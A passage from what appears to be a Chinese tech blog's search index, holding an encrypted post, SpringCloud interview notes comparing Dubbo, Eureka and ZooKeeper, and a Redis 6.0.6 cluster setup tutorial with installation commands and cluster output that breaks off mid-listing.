2ed115894c7f86f21c218a07c32b92ceafd7bb19b01ca1382dc5ca1433d668c02532bb2375d631e88b231ed3b5a82a44b0e79d58d1ab839fd07852b969d427b8091030fcb391c15bb7549f1f207d87c2a8354e0d01464de0bfea4fbbb89d813f5c3400f555fe581e123c1c74e318bcef0582659477d12b06579fb028b825f2dd5d911298205072da5967e03f4f9bb6f6067e7c77ea6f4a7765914d2471cf622cec9e61016e25f660e91e13b52828a051b7d5e736c685bdf34978c9d8d159c19241ea925da6d32c61aa359550c29ed24b01b3928da151fda41e8635419fbb64d9a834f626c4b6bba7583d34f2c9f18ee822d0d40569a98c26103ca94b41539a6955522bb7b83d4ea0fc459e753fa5101c3710f40f41246a2501fd0ad24e92297d7e96228daa510e2cf921f57c39dd80b4b2290f296c7cb711279f331506c3fa33eddc8130d02d81da7e7f215de3535dc0b8cb7adedb16537a51797257de7d0d6f03a098033e05aa1d0e8770b6f615f48f675958b908fedfaa4b9b608479cd0ae8977376aa8ced69a830fb1ae624d43cded65a8f947ab3a31dfe57229fbc6f905903e4a38d8f36e4533fe44edc22648a78f1bf196ead5ea64e301e74edf928225e9ea3b469df600d99b93d89b72de57f966aa87b427a98e8522668acef8690e21036c9802db142bbab136b878ede58b0f6365b73cc144867cc83f666cba510a9ca8033069fc510dbeed007b7e74c6bcd965b42124497db0924802409bfd4e83d228d269590c87d785c1f3198c2aeeb963737871f96e89f9985abf4d375310e55e2500a4733a59e79a8ca6dadd49cbb70fe8e9bce47cf329055c2100a594d0b01827591ef324b6448fa67a122fe4c599dfb156d3b4bad5fc57981b864e407bb26fc1d31273eb76cad8adb378bbd6c14bfdfddf46a0eb1d3e9ba991740d9da6d10b815f82977157860d01c1a9400f9798d71f8b7cc0ebe1a5839d8122ced0a20445fe51dc00bc1bbbae608b6b24d6f303515d807f996dd6557da80ef1c82d9161bf7945b81bfde5c36d50ce0a1a4480843bd70f0d931b60877cbc71d3b965a89e321369691c0c8c3ea0300a65d03a8d367ffe0c2b872ad3cd2521b809ab72717aa1182dc24764de0861c393a7993da858af593a5a84b82c0bf6452dd54f50ca143ee9da1f591a0ef0fe84945fb3479e5c9608172f68be8f8293567b4226b6df3d9a23c365c22b6cfc366f89743279be08cc15f363d0443a6f1cca388e3a97e42315e84ec1d5ae40b4e6a5bd0ad5555aa6772ea428a15f5ce5d65c101621d0e243617490ffdd7594c4a466f402da6f197490feee0c956b36e762cdbe3bf209cb423c17bf79abfd26a6215f69c7bb6c9b9ad11197167dd5bcbf4c62e6b0c6eca65b69bf4aaad26a9551a3e89fdd470d9e3d1979853d27b4d4c837dd0580fd06500e25ebd7384ca4fd17ad6d66535945afb6d884bc2fcfe0e3009c4617df1e04107350cfe4e15a4345c263d9f8372e93356402797ae2c613dfee7106ea32908a8284a18a67527b2f0f16216b3555a504d1a2a3f25fd32427481259b4bc68d0c482e6a4cd7879a8634fe7ee1abf1200f48aee12aa4c8b8bfc2678bd84a3cabdf9252f9fcfefff7e089b63a26b2f9091cfb11057caac9d7fa7fa0ff148772dd7d9ca5c424de9cc1a386630b29b6b07c2a91766a71f3ff25b36775f1ea7bad20f6dd3465d939a8887f497d9ffa666a60cc316c557179a4ebbeba63f7f2cab9fbbaba0bc205b1d18eb3f0386113ae29b87f0b1fd5283060fd0d0e76146ae02beaa70624173555ae3e29b45c73931dd309c3bff9045d0563a8b61c4df8f809b6ac636f63705f405888d2f457c13ee62d8eac0b903c905da85a11f2c10be2dc19a842b69667dd4f596524d8f5d7ebd73fd0458b075abec6a67bb38f74290439ed6feb66201bacf6778bb66eb6ac5b41ad6d9da0facda0e3a91ad4c8cbaf60555d343531e28d2de5afcb6a7eb9379717374d958d19c2431cd70e8e1ad53d01ec1193f05a11079f8fac03a61b4cb43d593c8b66ce67f2421ab829472bc1b6a459f41629fe1cc9dec61fe623c7bf7b5779bf4be5a10dfb79acfff03b301485327c1dcd26347356f56d83e9c0dad1fbdd2783d9d8e1101018370441447b2dea7752df529452069f64526a7d26fe26b9833774e035d6b6df140305475a8c8874aa1b27280fc7833727252791c03327489fe160669d731beaa46b4670f1193caf52777d733428cd2bfae85e96a69c31638951d09b3a7673f04fc846613092b5a5347b8277a7f9c94c88e5f5c1d17ed06cec044efc84bf56c55221bb073c04903f8f0dee6a95ea75e2358e4b428a6b2e2211fd8ede72ac524faa662a9acfdf225067bbec71b81bc389de277f186a5c36e0f45d5e6d22283366475cf7d8dff9d4307cbf46ba83b66cb4bfbc4af9dac74e5ce16d7e0ba5fe4fa0d1c370c73096a3373ab66b1a0482a049c433ef033afe0e85a8dd4a87c731729370f90802399a19a2445690225e9b8bf9389208ce4bc44267cc13a9bfca5a5b5f496ec86eedef5da9747528eff814adfa562f6acf22fb3211864f5e8117e9d3286668cbb2bae5ed9246ab6deb907ecb37c65c0a5de28152fb7269baf67a5f64773c6b6c74dd06fca35555c663df40a037f9ecf586dd5378bf44b1dd1116649b2e4f86a1ae18017ae81317fb8e996bf5ad82b6520bdcb23ec71d452fbc9a33485a3c86bff5d621e5fff3cd1c06dc65f3313ff35899700f9bbc394799dab0e3455101aa617c652819d20b3bcb267354df746267766500745efb9825809f15383d43e1c5320fe2264d9b68ba1e40ab202ec956e6d98c99ee48976638ea89d9d2599e7ac0b2794d0fa198d30282cf79eb28aa6838da1ae8b79792821ac2d8897d9d08c899bc5e3249c22a281d36bb7c2c70be402d7254120645f881b6e197ca5f0f5c2c17281b2cf8294370e5a5039a9bb83e3a3527329d17839179717 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"SpringCloud 面试题之一",url:"/posts/1cdff3b4.html",text:'微服务微服务的概述微服务理论的提出者马丁。福勒（Martin Fowler） 在其博客中详细描述了什么是微服务。微服务强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题 / 提供落地对应服务的一个服务应用；狭意的看，可以看作 Eclipse 里面的一个个微服务工程 / 或者 Module。 微服务架构的概述微服务架构是一种架构模式或者说是一种架构风格，它提倡将单一应用程序划分为一组小服务，每个服务运行在自己的独立进程中，服务间通信采用轻量级通信机制 (通常是基于 HTTP 的 RESTful API)。每个服务都围绕着具体业务进行构建，并且能够被独立地部署到生产环境、类生产环境等。另外，应该尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的编程语言、工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的编程语言来编写服务，也可以使用不同的数据存储技术。 微服务架构的优缺点 优点： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 只有业务逻辑的代码，不会和 HTML、CSS 或者其他前端页面耦合，目前有两种开发模式：前后端分离、全栈开发 缺点： 运维要求高：更多的服务意味着更多的运维投入 技术开发难度高：涉及到网络通信延迟、服务容错、数据一致性、系统集成测试、系统部署依赖、性能监控等 分布式系统固有的复杂性：使用微服务架构的是分布式系统，对于一个分布式系统，系统容错，网络延迟，分布式事务等都会带来巨大的挑战 接口调整成本高：微服务之间通过接口进行通信。如果修改某一个微服务的 API，可能所有使用了该接口的微服务都需要做调整 重复劳动：很多服务可能都会使用到相同的功能，而这个功能并没有达到分解为一个微服务的程度，这个时候，可能各个服务都会开发这一功能，从而导致代码重复 SpringBoot 与 SpringCloudSpringBoot 与 SpringCloud 的关系 SpringBoot 专注于快速、方便的开发单个微服务个体，SpringCloud 则关注全局的服务治理 SpringCloud 将 SpringBoot 开发的一个个单体微服务整合并管理起来，为各个微服务之间提供配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等集成的服务 SpringBoot 可以离开 SpringCloud 独立使用开发项目，但是 SpringCloud 离不开 SpringBoot，属于依赖的关系 Dubbo 对比 SpringCloudRPC 与 REST 的区别微服务理论的提出者马丁。福勒（Martin Fowler），在其论文中可以发现其定义的服务间通信机制就是 HTTP REST。RPC 的性能比较出众，其最主要的缺陷就是服务提供方和调用方式之间依赖太强，毕竟需要为每一个微服务进行接口的定义，并通过持续集成发布，需要严格的版本控制才不会出现服务提供和调用之间因为版本不同而产生的冲突。而 REST 是轻量级的接口，服务的提供和调用不存在代码之间的耦合，只是通过一个约定进行规范，但也有可能出现文档和接口不一致而导致的服务集成问题，但可以通过 Swagger 工具整合，是代码和文档一体化解决，所以 REST 在分布式环境下比 RPC 更加灵活，这也是为什么当当网的 DubboX 在对 Dubbo 的增强中增加了对 REST 的支持的原因。 Dubbo 与 SpringCloud 的区别 功能 Dubbo SpringCloud 服务注册中心 Zookeeper、Nacos、Redis Spring Cloud Netfix Eureka 服务调用方式 RPC REST API 服务监控 Dubbo-Monitor Spring Boot Admin 熔断器 Sentinel Spring Cloud Netflix Hystrix 服务网关 无 Spring Cloud Netflix Zuul 分布式配置 Nacos Spring Cloud Config 服务跟踪 无 Spring Cloud Sleuth 数据流 无 Spring Cloud Stream 批量任务 无 Spring Cloud Task 信息总线 无 Spring Cloud Bus 最大区别：SpringCloud 抛弃了 Dubbo 的 RPC 通信，采用的是基于 HTTP 的 REST 方式。严格来说这两种技术方案各有优劣。虽然从一定程度上来说，SpringCloud 牺牲了服务调用的性能，但也避免了原生 RPC 带来的问题。而且 REST 相比 RPC 更为灵活，服务提供方和调用方的依赖只依靠一纸契约，不存在代码级别的强依赖，这在强调快速演化的微服务环境下，显得更加合适。 定位区别：Dubbo 是 SOA 时代的产物，它的关注点主要在于服务的调用，流量分发、流量监控和熔断。而 SpringCloud 诞生于微服务架构时代，考虑的是微服务治理的方方面面，另外由于依托了 Spirng、SpirngBoot 的优势之上，两个框架在开始目标就不一致，Dubbo 定位为 RPC 框架、SpirngCloud 定位为微服务架构下的一站式解决方案（微服务生态）。作为重启 Dubbo 开源项目的负责人刘军也曾表示，如果非要类比的话，Dubbo 可以类比为 Netfix OSS 技术栈，而 SpringCloud 集成了 Netfix OSS 作为分布式服务治理解决方案，但除此之外 SpringCloud 还提供了包括 config、stream、security 等等分布式问题解决方案。当前由于 RPC 协议、注册中心元数据不匹配等问题，在面临微服务基础框架选型时，Dubbo 与 SpringCloud 只能二选一。Dubbo 日后可能会积极适配到 SpringCloud 生态，比如作为 SpringCloud 的二进制通讯方案来发挥 Dubbo 的性能优势，或者 Dubbo 通过模块化以及对 HTTP 的支持适配到 SpringCloud。 品牌机与组装机的区别：Spring Cloud 的功能很明显比 Dubbo 更加强大，涵盖面更广，而且作为 Spring 的旗舰项目，它也能够与 Spring Framework、Spring Boot、Spring Data、Spring Batch 等其他 Spring 项目完美融合，这些对于微服务而言是至关重要的。使用 Dubbo 构建的微服务架构就像组装电脑，各环节选择自由度很高，但是最终结果很有可能因为一条内存质量不行就点不亮了，总是让人不怎么放心，但是如果使用者是一名高手，那这些都不是问题。而 Spring Cloud 就像品牌机，在 Spring Source 的整合下，做了大量的兼容性测试，保证了机器拥有更高的稳定性，但是如果要在使用非原装组件外的东西，就需要对其基础原理有足够的了解。 社区支持与更新力度的区别：最为重要的是，Dubbo 停止了 5 年左右的更新，虽然 2017.9 重启了。对于技术发展的新需求，需要由开发者自行拓展升级（比如当当网自研了 Dubbox），这对于很多想要采用微服务架构的中小型软件公司，显然是不太合适的。中小型软件公司没有这么强大的技术能力去修改 Dubbo 源码 + 周边的一整套解决方案，并且不是每一个公司都有阿里的大牛 + 真实的线上生产环境测试经修改过源码的框架。 其他组件对比Eureka 对比 ZooKeeper ZooKeeper 保证的是 CP，Eureka 保证的是 AP Eureka 本质上是一个工程，而 ZooKeeper 只是一个进程 ZooKeeper 有 Leader 和 Follower 角色，Eureka 各个节点是平等关系 ZooKeeper 在选举期间注册服务瘫痪，虽然服务最终会恢复，但是选举期间不可用；Eureka 只要有一实例就可以保证服务可用，但查询到的数据可能并不是最新的 ZooKeeper 采用过半数存活原则，Eureka 采用自我保护机制解决分区问题 Eureka 自我保护机制会导致： Eureka 不再从注册列表移除因长时间没收到心跳而应该过期的服务 Eureka 仍然能够接受新服务的注册和查询请求，但是不会被同步到其他节点（高可用） Eureka 在网络稳定的时候，当前实例新的注册信息会被同步到其他节点中（最终一致性） Eureka 可以很好的应对因网络故障导致部分节点失去联系的情况，而不会像 ZooKeeper 一样使得整个注册中心瘫痪 多种主流注册中心的对比 Zuul 对比 Spring Cloud Gateway 常见问答什么是服务熔断、服务降级在复杂的分布式系统中，微服务之间的相互调用，有可能出现各种各样的原因导致服务的阻塞；在高并发场景下，服务的阻塞意味着线程的阻塞，导致当前线程不可用，更严重的会让服务器线程全部阻塞，导致服务器崩溃。由于服务之间的调用关系是同步的，会对整个微服务系统造成服务雪崩。为了解决某个微服务的调用响应时间过长或者不可用进而占用越来越多的系统资源引起的雪崩效应，这就需要进行服务熔断和服务降级处理。服务熔断指的是某个服务出现故障或异常时，起到类似现实世界中的 “保险丝” 的作用，即当某个异常条件被触发就直接熔断整个服务，而不是一直等到此服务超时。简而言之，一旦发生服务雪崩就会熔断整个服务，通过维护一个线程池，当线程达到阈值的时候就启动服务降级，如果其他请求继续访问就直接返回 FallBack 的默认值。 什么是 API 网关API 网关提供 API 全托管服务，丰富的 API 管理功能，辅助企业管理大规模的 API，以降低管理成本和安全风险。其中包括： 协议适配：当对外提供服务时使用 HTTP 协议、内部服务调用时使用 RPC，此时需要协议适配 协议转发：将外部的 HTTP 请求转换为内部的 RPC 请求 安全策略（WAF）：恶意攻击、电商系统或者 O2O 系统的防刷单、Web 爬虫 系统防刷：防刷单、Web 爬虫 流量控制：限流、防 DDOS 攻击 监控日志：API 调用日志 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Linux 搭建 Redis 高可用集群",url:"/posts/b8e96a9f.html",text:'前言软件环境 软件 版本 CentOS 7.9 Redis 6.0.6 集群节点规划Redis 集群至少一共需要 6 个节点，包括 3 个 Master 节点和 3 个 Slave 节点，且每个 Master 节点对应 1 个 Slave 节点，对应的关系如下： 1 Master –&gt; 1 Slave，Redis 集群需要 6 个节点，如图所示 1 Master –&gt; 2 Slave，Redis 集群需要 9 个节点，以此类推，如图所示 名称 IP 端口 Master 192.168.109 7001 Master 192.168.109 7002 Master 192.168.109 7003 Slave 192.168.109 7004 Slave 192.168.109 7005 Slave 192.168.109 7006 Redis 集群特性Redis 集群的优点无中心架构，分布式提供服务。数据按照 slot 存储分布在多个 Redis 实例上。增加 Slave 做 Standby 数据副本，用于 Failover，使集群快速恢复。实现故障 Auto Failover，节点之间通过 gossip 协议交换状态信息；投票机制完成 Slave 到 Master 角色的提升。支持在线增加或减少节点，降低硬件成本和运维成本，提高系统的扩展性和可用性。 Redis 集群的缺点客户端实现复杂，驱动要求实现 Smart Client，缓存 Slots Mapping 信息并及时更新。目前仅 JedisCluster 相对成熟，异常处理部分还不完善。客户端的不成熟，影响应用的稳定性，提高开发难度。节点会因为某些原因发生阻塞（阻塞时间大于 clutser-node-timeout），被判断为下线。这种 Failover 是没有必要的，Sentinel 模式也存在这种切换场景。 Redis 集群搭建系统初始化12345678# 添加配置一# echo "net.core.somaxconn = 1024" &gt;&gt; /etc/sysctl.conf# echo "vm.overcommit_memory = 1" &gt;&gt; /etc/sysctl.conf# sysctl -p# 添加配置二# echo "echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled" &gt;&gt; /etc/rc.local# source /etc/rc.local 创建 Redis 用户12345# 创建redis用户组# groupadd redis# 创建redis用户（不允许远程登录）# useradd -g redis redis -s /bin/false Redis 编译安装Redis 各版本可以从官网下载，这里使用的版本是 6.0.6 1234567891011121314151617181920212223242526272829303132333435363738# 安装依赖# yum install -y centos-release-scl devtoolset-9 scl-utils-build tcl# 临时启用GCC9编译环境# scl enable devtoolset-9 bash# 下载文件# wget http://download.redis.io/releases/redis-6.0.6.tar.gz# 解压文件# tar -xvf redis-6.0.6.tar.gz# 进入解压目录# cd redis-6.0.6# 编译# make# 安装# make install PREFIX=/usr/local/redis# 创建软连接# ln -s /usr/local/redis/bin/redis-benchmark /usr/local/bin/redis-benchmark# ln -s /usr/local/redis/bin/redis-check-aof /usr/local/bin/redis-check-aof# ln -s /usr/local/redis/bin/redis-check-rdb /usr/local/bin/redis-check-rdb# ln -s /usr/local/redis/bin/redis-sentinel /usr/local/bin/redis-sentinel# ln -s /usr/local/redis/bin/redis-server /usr/local/bin/redis-server# ln -s /usr/local/redis/bin/redis-cli /usr/local/bin/redis-cli# 拷贝配置文件# cp redis.conf /usr/local/redis# 创建日志目录# mkdir -p /var/log/redis# 文件授权# chown -R redis:redis /var/log/redis# chown -R redis:redis /usr/local/redis 更改 Redis 的基础配置内容，其中有些配置文件的文件名都包含了端口号，是为了后面方便使用不同的端口号来区分各个节点 1234567891011121314# 更改基础配置# vim /usr/local/redis/redis.confio-threads 2daemonize yes# bind 127.0.0.1protected-mode nomasterauth 123456requirepass 123456dbfilename dump_6379.rdbpidfile /var/run/redis_6379.pidcluster-config-file nodes_6379.confappendfilename "appendonly_6379.aof"logfile "/var/log/redis/redis_6379.log" 验证 Redis 是否安装成功 12345678910111213141516# 切换Redis用户# su redis# 进入安装目录$ cd /usr/local/redis# 启动Redis$ ./bin/redis-server redis.conf# 查看Redis的运行状态$ ps -aux|grep redis# 关闭Redis$ ./bin/redis-cli127.0.0.1:6379&gt; auth 123456127.0.0.1:6379&gt; shutdown Redis 搭建集群创建 Redis 集群各节点的安装文件，并更改与端口相关的所有配置内容（例如：port、pidfile、dbfilename、logfile、cluster-config-file），同时开启对集群的支持 1234567891011121314151617181920212223242526# 创建集群目录# mkdir -p /usr/local/redis-cluster# 拷贝各节点的安装文件# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7001# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7002# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7003# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7004# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7005# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7006# 更改各节点里与端口相关的所有配置项# sed -i "s/6379/7001/g" /usr/local/redis-cluster/redis-7001/redis.conf# sed -i "s/6379/7002/g" /usr/local/redis-cluster/redis-7002/redis.conf# sed -i "s/6379/7003/g" /usr/local/redis-cluster/redis-7003/redis.conf# sed -i "s/6379/7004/g" /usr/local/redis-cluster/redis-7004/redis.conf# sed -i "s/6379/7005/g" /usr/local/redis-cluster/redis-7005/redis.conf# sed -i "s/6379/7006/g" /usr/local/redis-cluster/redis-7006/redis.conf# 开启各节点对集群的支持# sed -i "s/# cluster-enabled/cluster-enabled/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-config-file/cluster-config-file/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-node-timeout/cluster-node-timeout/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# 文件授权# chown -R redis:redis /usr/local/redis-cluster 拷贝 Redis 的集群管理工具 12345678# 进入Redis的解压目录# cd redis-6.0.6# 拷贝集群管理工具# cp src/redis-trib.rb /usr/local/redis-cluster# 文件授权# chown -R redis:redis /usr/local/redis-cluster/redis-trib.rb 创建 Shell 脚本批量启动 Redis 集群的各个节点 12345678910111213141516171819202122# vim /usr/local/redis-cluster/start-cluster.sh#!/bin/bashREDIS_CLUSTER_HOME=/usr/local/redis-clustercd $REDIS_CLUSTER_HOMEcd redis-7001./bin/redis-server redis.confcd ..cd redis-7002./bin/redis-server redis.confcd ..cd redis-7003./bin/redis-server redis.confcd ..cd redis-7004./bin/redis-server redis.confcd ..cd redis-7005./bin/redis-server redis.confcd ..cd redis-7006./bin/redis-server redis.conf Shell 脚本授权执行 123# 文件授权# chmod +x /usr/local/redis-cluster/start-cluster.sh# chown -R redis:redis /usr/local/redis-cluster/start-cluster.sh Redis 集群设置密码若需要对集群各节点设置密码，那么 requirepass 和 masterauth 都需要同时设置，且两者的密码必须一致，否则发生主从切换时，就会遇到授权问题。值得一提的是，在使用 redis-trib.rb 或者 redis-cli 构建集群的时候，两者设置密码的方式是不一样的，具体如下： redis-trib.rb：如果是使用 redis-trib.rb 工具构建集群，集群构建完成前不要配置密码，集群构建完毕需要执行以下命令逐个节点机器设置密码，不需要重启节点 1234$ redis-cli -c -p 7001config set masterauth 123456config set requirepass 123456config rewrite redis-cli：如果是使用 redis-cli 构建集群，首先需要在集群各节点的 redis.conf 中配置密码，包括 requirepass 和 masterauth，然后在构建集群的命令行里加入 -a password 参数，其中的 password 就是集群各节点的密码 12masterauth 123456requirepass 123456 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 Redis 集群构建启动首先执行 Shell 脚本批量启动所有 Redis 节点，切记不能以 Root 用户的身份启动 Redis，否则会造成系统重大安全隐患 123456789101112131415# 切换到Redis用户# su redis# 启动集群节点$ ./usr/local/redis-cluster/start-cluster.sh# 查看各节点的运行状态$ ps -aux|grep redisredis 32641 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7001 [cluster]redis 32649 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7002 [cluster]redis 32657 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7003 [cluster]redis 20814 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7004 [cluster]redis 20822 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7005 [cluster]redis 20830 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7006 [cluster] 使用 redis-trib.rb 工具构建集群时，在 6.0.6 里面会给打印提示，让你使用 redis-cli 命令来构建集群，并提供给你需要使用的命令，使其和 redis-trib.rb 达到一致的效果（这样就可以不用再单独的安装 Ruby），原本使用 redis-trib.rb 的语句如下 1234567$ ./redis-trib.rb create --replicas 1 \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 提供使用的 redis-cli 的语句如下，建议使用 redis-cli 命令来构建 Redis 集群，因为这样就不需要额外安装 Ruby 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 可以看出两个语句都差不多，而且语句意思也差不多，--cluster-replicas 1 表示主备的比例关系为 1，即一个主节点对应一个备节点，前三个 ip:port 默认表示主节点，后面的依次为前三个主节点的备节点。在生产环境使用多台服务器搭建 Redis 集群时，为了保证高可用（在任意一台服务器挂了的情况下都不影响 Redis 集群的使用），主备节点不可以部署在同一台服务器上，因为主备节点在同一台服务器上，则备节点也没有太大的意义了，所以要错开对应。当主节点宕机后，备节点可以充当主节点继续工作，使 Redis 集群正常运行。 执行完构建集群的命令后（只需执行一次），Redis 默认罗列出集群的对应关系来让你确定，输入 yes 完成集群创建即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Master[0] -&gt; Slots 0 - 5460Master[1] -&gt; Slots 5461 - 10922Master[2] -&gt; Slots 10923 - 16383Adding replica 192.168.1.109:7006 to 192.168.1.109:7001Adding replica 192.168.1.109:7003 to 192.168.1.109:7004Adding replica 192.168.1.109:7005 to 192.168.1.109:7002M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) masterM: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) masterM: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) masterS: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5Can I set the above configuration? (type \'yes\' to accept):&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7001)M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)M: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots: (0 slots) slave replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 测试 Redis 集群Redis 客户端登录进某个集群节点，登录时需要指定密码，下面可以看到数据放入的哈希槽为 [12182]，属于 192.168.1.109:7002 所管控的节点，所以就直接跳转到 192.168.1.109:7002 节点来获取刚才放入的数据 12345678$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; set foo hello-&gt; Redirected to slot [12182] located at 192.168.1.109:7002OK192.168.1.109:7002&gt; get foo"hello"192.168.1.109:7002&gt; 查看 Redis 当前集群的信息 12345678910111213141516171819202122$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:6cluster_size:3cluster_current_epoch:7cluster_my_epoch:1cluster_stats_messages_ping_sent:3154cluster_stats_messages_pong_sent:3377cluster_stats_messages_fail_sent:4cluster_stats_messages_auth-ack_sent:1cluster_stats_messages_sent:6536cluster_stats_messages_ping_received:3372cluster_stats_messages_pong_received:3154cluster_stats_messages_meet_received:5cluster_stats_messages_auth-req_received:1cluster_stats_messages_received:6532 查看 Redis 特定节点的状态 12345678910111213141516171819202122232425262728293031$ redis-cli --cluster check 192.168.1.109:7003 -a 123456Warning: Using a password with \'-a\' or \'-u\' option on the command line interface may not be safe.192.168.1.109:7003 (cde86683...) -&gt; 0 keys | 5462 slots | 1 slaves.192.168.1.109:7002 (283abb49...) -&gt; 1 keys | 5461 slots | 1 slaves.192.168.1.109:7001 (225e37e5...) -&gt; 0 keys | 5461 slots | 1 slaves.[OK] 1 keys in 3 masters.0.00 keys per slot on average.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7003)M: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots: (0 slots) slave replicates cde86683e2d314fd52cf8708f78935c6648ea3c6M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 查看 Redis 所有集群节点的信息 123456789$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster nodes7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 master - 0 1616460018217 3 connected 5461-10922225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616460015000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616460018000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 